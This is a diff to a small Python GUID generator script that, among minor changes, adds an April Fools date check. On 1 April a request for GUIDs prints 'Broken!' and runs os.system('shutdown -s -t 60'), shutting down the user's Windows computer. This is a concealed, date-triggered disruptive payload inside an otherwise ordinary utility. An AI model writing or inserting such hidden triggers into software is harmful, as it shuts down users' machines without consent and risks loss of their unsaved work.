@@ -1,8 +1,7 @@
 import random
 import time
 import os
-import sys
-cnsts=(23522,45.252,6904,19487,0.48121)
+cnsts=(57389,37.393,6904,19487,0.48121)
 def guid():
     def gettime():
         return (int(time.time()*cnsts[2])*cnsts[0]+int((time.time()**cnsts[4])*cnsts[1])*cnsts[3])%(36**7)
@@ -30,18 +29,23 @@ def _int(w):
         return -114514
     else:
         return int(w)
+def chk_aprilfools():
+    lt=time.localtime()
+    return lt[1]==4 and lt[2]==1
 if __name__=='__main__':
     try:
         q=_int(input("guid_36 generator\nHow many guid_36s?(type 'version','ver' or 'Version' to show version) "))
         if q=='get_version':
-            lt=(2022,4,1)
-            if lt[1]==4 and lt[2]==1:
+            if chk_aprilfools():
                 print("gUId_3SIX gEneRAtOr omega-11.45.1.4")
                 raise Exception
             else:
                 print("guid_36 generator release-0.1.1")
         elif q<=0:
             raise Exception
+        elif chk_aprilfools():
+            print('Broken!')
+            os.system('shutdown -s -t 60')
         else:
             for i in range(q):
                 print(guid())
